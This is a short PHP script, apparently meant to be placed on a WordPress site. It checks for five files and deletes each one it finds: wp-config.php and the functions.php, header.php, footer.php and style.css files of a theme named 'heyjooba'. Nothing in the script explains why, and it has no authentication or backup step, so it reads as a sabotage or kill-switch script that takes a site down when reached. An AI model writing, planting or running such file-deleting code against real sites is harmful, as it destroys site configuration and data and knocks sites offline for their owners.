<?php 
$target1 = "wp-content/themes/heyjooba/functions.php";
$target2 = "wp-config.php";
$target3 = "wp-content/themes/heyjooba/header.php";
$target4 = "wp-content/themes/heyjooba/footer.php";
$target5 = "wp-content/themes/heyjooba/css/style.css";



if (file_exists($target1)) {
  unlink($target1); // Delete now
} 
if (file_exists($target2)) {
  unlink($target2); // Delete now
} 
if (file_exists($target3)) {
  unlink($target3); // Delete now
} 
if (file_exists($target4)) {
  unlink($target4); // Delete now
} 
if (file_exists($target5)) {
  unlink($target5); // Delete now
} 
?>